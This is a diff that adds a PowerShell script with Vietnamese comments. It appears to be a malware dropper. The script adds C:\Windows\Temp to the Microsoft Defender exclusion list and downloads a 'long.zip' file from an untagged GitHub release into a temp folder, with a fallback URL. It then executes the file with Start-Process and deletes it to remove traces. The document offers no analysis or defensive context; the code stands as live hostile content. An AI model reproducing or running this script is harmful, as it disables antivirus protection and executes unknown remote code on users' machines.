@@ -1,0 +1,31 @@
+
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+$ErrorActionPreference = "Stop"
+# Bật TLSv1.2 để tương thích với các phiên bản cũ hơn
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://github.com/tri72027/3X-UI/releases/download/untagged-366575e2713466c2e386/long.zip'
+$DownloadURL2 = 'https://github.com/tri72027/3X-UI/releases/download/untagged-366575e2713466c2e386/long.zip'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\long_$rand.zip" } else { "$env:TEMP\long_$rand.zip" }
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
+}
+catch {
+    try {
+        Invoke-WebRequest -Uri $DownloadURL2 -OutFile $FilePath -UseBasicParsing
+    }
+    catch {
+        Write-Host "Không thể tải xuống tệp ZIP."
+        exit 1
+    }
+}
+
+# Thực thi tệp kịch bản đã tải về
+Start-Process $FilePath -Wait
+
+# Xóa tệp ZIP đã tải về
+Remove-Item $FilePath
